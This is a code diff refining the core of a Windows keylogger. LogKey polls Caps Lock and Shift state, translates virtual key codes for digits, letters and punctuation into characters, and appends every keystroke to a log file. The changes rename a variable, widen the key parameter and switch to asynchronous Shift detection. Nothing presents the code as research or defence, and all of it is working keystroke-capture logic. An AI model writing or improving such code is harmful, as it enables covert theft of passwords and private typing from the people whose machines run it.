@@ -3,14 +3,16 @@
 void Log(char* input, const char fileName[]) {
 	FILE* f = fopen(fileName, "a+");
 	if (f) {
-		fprintf(f, "%s\n", input); 
+		fprintf(f, "%s\n", input);
 		fclose(f);
 	}
 }
 
-bool LogKey(char key) {
-	capital = GetKeyState(VK_CAPITAL) & 1; // check toggled
-	shift = GetKeyState(VK_SHIFT) & 0x8000; // check key down
+bool LogKey(int key) {
+	caps = GetKeyState(VK_CAPITAL) & 1; // check toggled
+	shift = GetAsyncKeyState(VK_SHIFT) & 0x8000; // check key down
+
+
 
 	switch (key) {
 		case 0x30: Log(shift ? "[ShiftDown])" : "0"); return true;
@@ -24,32 +26,32 @@ bool LogKey(char key) {
 		case 0x38: Log(shift ? "[ShiftDown]*" : "8"); return true;
 		case 0x39: Log(shift ? "[ShiftDown](" : "9"); return true;
 
-		case 0x41: Log(capital ? (shift ? "[ShiftDown]a" : "A") : (shift ? "[ShiftDown]A" : "a")); return true;
-		case 0x42: Log(capital ? (shift ? "[ShiftDown]b" : "B") : (shift ? "[ShiftDown]B" : "b")); return true;
-		case 0x43: Log(capital ? (shift ? "[ShiftDown]c" : "C") : (shift ? "[ShiftDown]C" : "c")); return true;
-		case 0x44: Log(capital ? (shift ? "[ShiftDown]d" : "D") : (shift ? "[ShiftDown]D" : "d")); return true;
-		case 0x45: Log(capital ? (shift ? "[ShiftDown]e" : "E") : (shift ? "[ShiftDown]E" : "e")); return true;
-		case 0x46: Log(capital ? (shift ? "[ShiftDown]f" : "F") : (shift ? "[ShiftDown]F" : "f")); return true;
-		case 0x47: Log(capital ? (shift ? "[ShiftDown]g" : "G") : (shift ? "[ShiftDown]G" : "g")); return true;
-		case 0x48: Log(capital ? (shift ? "[ShiftDown]h" : "H") : (shift ? "[ShiftDown]H" : "h")); return true;
-		case 0x49: Log(capital ? (shift ? "[ShiftDown]i" : "I") : (shift ? "[ShiftDown]I" : "i")); return true;
-		case 0x4A: Log(capital ? (shift ? "[ShiftDown]j" : "J") : (shift ? "[ShiftDown]J" : "j")); return true;
-		case 0x4B: Log(capital ? (shift ? "[ShiftDown]k" : "K") : (shift ? "[ShiftDown]K" : "k")); return true;
-		case 0x4C: Log(capital ? (shift ? "[ShiftDown]l" : "L") : (shift ? "[ShiftDown]L" : "l")); return true;
-		case 0x4D: Log(capital ? (shift ? "[ShiftDown]m" : "M") : (shift ? "[ShiftDown]M" : "m")); return true;
-		case 0x4E: Log(capital ? (shift ? "[ShiftDown]n" : "N") : (shift ? "[ShiftDown]N" : "n")); return true;
-		case 0x4F: Log(capital ? (shift ? "[ShiftDown]o" : "O") : (shift ? "[ShiftDown]O" : "o")); return true;
-		case 0x50: Log(capital ? (shift ? "[ShiftDown]p" : "P") : (shift ? "[ShiftDown]P" : "p")); return true;
-		case 0x51: Log(capital ? (shift ? "[ShiftDown]q" : "Q") : (shift ? "[ShiftDown]Q" : "q")); return true;
-		case 0x52: Log(capital ? (shift ? "[ShiftDown]r" : "R") : (shift ? "[ShiftDown]R" : "r")); return true;
-		case 0x53: Log(capital ? (shift ? "[ShiftDown]s" : "S") : (shift ? "[ShiftDown]S" : "s")); return true;
-		case 0x54: Log(capital ? (shift ? "[ShiftDown]t" : "T") : (shift ? "[ShiftDown]T" : "t")); return true;
-		case 0x55: Log(capital ? (shift ? "[ShiftDown]u" : "U") : (shift ? "[ShiftDown]U" : "u")); return true;
-		case 0x56: Log(capital ? (shift ? "[ShiftDown]v" : "V") : (shift ? "[ShiftDown]V" : "v")); return true;
-		case 0x57: Log(capital ? (shift ? "[ShiftDown]w" : "W") : (shift ? "[ShiftDown]W" : "w")); return true;
-		case 0x58: Log(capital ? (shift ? "[ShiftDown]x" : "X") : (shift ? "[ShiftDown]X" : "x")); return true;
-		case 0x59: Log(capital ? (shift ? "[ShiftDown]y" : "Y") : (shift ? "[ShiftDown]Y" : "y")); return true;
-		case 0x5A: Log(capital ? (shift ? "[ShiftDown]z" : "Z") : (shift ? "[ShiftDown]Z" : "z")); return true;
+		case 0x41: Log(caps ? (shift ? "[ShiftDown]a" : "A") : (shift ? "[ShiftDown]A" : "a")); return true;
+		case 0x42: Log(caps ? (shift ? "[ShiftDown]b" : "B") : (shift ? "[ShiftDown]B" : "b")); return true;
+		case 0x43: Log(caps ? (shift ? "[ShiftDown]c" : "C") : (shift ? "[ShiftDown]C" : "c")); return true;
+		case 0x44: Log(caps ? (shift ? "[ShiftDown]d" : "D") : (shift ? "[ShiftDown]D" : "d")); return true;
+		case 0x45: Log(caps ? (shift ? "[ShiftDown]e" : "E") : (shift ? "[ShiftDown]E" : "e")); return true;
+		case 0x46: Log(caps ? (shift ? "[ShiftDown]f" : "F") : (shift ? "[ShiftDown]F" : "f")); return true;
+		case 0x47: Log(caps ? (shift ? "[ShiftDown]g" : "G") : (shift ? "[ShiftDown]G" : "g")); return true;
+		case 0x48: Log(caps ? (shift ? "[ShiftDown]h" : "H") : (shift ? "[ShiftDown]H" : "h")); return true;
+		case 0x49: Log(caps ? (shift ? "[ShiftDown]i" : "I") : (shift ? "[ShiftDown]I" : "i")); return true;
+		case 0x4A: Log(caps ? (shift ? "[ShiftDown]j" : "J") : (shift ? "[ShiftDown]J" : "j")); return true;
+		case 0x4B: Log(caps ? (shift ? "[ShiftDown]k" : "K") : (shift ? "[ShiftDown]K" : "k")); return true;
+		case 0x4C: Log(caps ? (shift ? "[ShiftDown]l" : "L") : (shift ? "[ShiftDown]L" : "l")); return true;
+		case 0x4D: Log(caps ? (shift ? "[ShiftDown]m" : "M") : (shift ? "[ShiftDown]M" : "m")); return true;
+		case 0x4E: Log(caps ? (shift ? "[ShiftDown]n" : "N") : (shift ? "[ShiftDown]N" : "n")); return true;
+		case 0x4F: Log(caps ? (shift ? "[ShiftDown]o" : "O") : (shift ? "[ShiftDown]O" : "o")); return true;
+		case 0x50: Log(caps ? (shift ? "[ShiftDown]p" : "P") : (shift ? "[ShiftDown]P" : "p")); return true;
+		case 0x51: Log(caps ? (shift ? "[ShiftDown]q" : "Q") : (shift ? "[ShiftDown]Q" : "q")); return true;
+		case 0x52: Log(caps ? (shift ? "[ShiftDown]r" : "R") : (shift ? "[ShiftDown]R" : "r")); return true;
+		case 0x53: Log(caps ? (shift ? "[ShiftDown]s" : "S") : (shift ? "[ShiftDown]S" : "s")); return true;
+		case 0x54: Log(caps ? (shift ? "[ShiftDown]t" : "T") : (shift ? "[ShiftDown]T" : "t")); return true;
+		case 0x55: Log(caps ? (shift ? "[ShiftDown]u" : "U") : (shift ? "[ShiftDown]U" : "u")); return true;
+		case 0x56: Log(caps ? (shift ? "[ShiftDown]v" : "V") : (shift ? "[ShiftDown]V" : "v")); return true;
+		case 0x57: Log(caps ? (shift ? "[ShiftDown]w" : "W") : (shift ? "[ShiftDown]W" : "w")); return true;
+		case 0x58: Log(caps ? (shift ? "[ShiftDown]x" : "X") : (shift ? "[ShiftDown]X" : "x")); return true;
+		case 0x59: Log(caps ? (shift ? "[ShiftDown]y" : "Y") : (shift ? "[ShiftDown]Y" : "y")); return true;
+		case 0x5A: Log(caps ? (shift ? "[ShiftDown]z" : "Z") : (shift ? "[ShiftDown]Z" : "z")); return true;
 
 		case VK_OEM_1:  Log(shift ? "[ShiftDown]:" : ";"); return true;
 		case VK_OEM_2:  Log(shift ? "[ShiftDown]?" : "/"); return true;
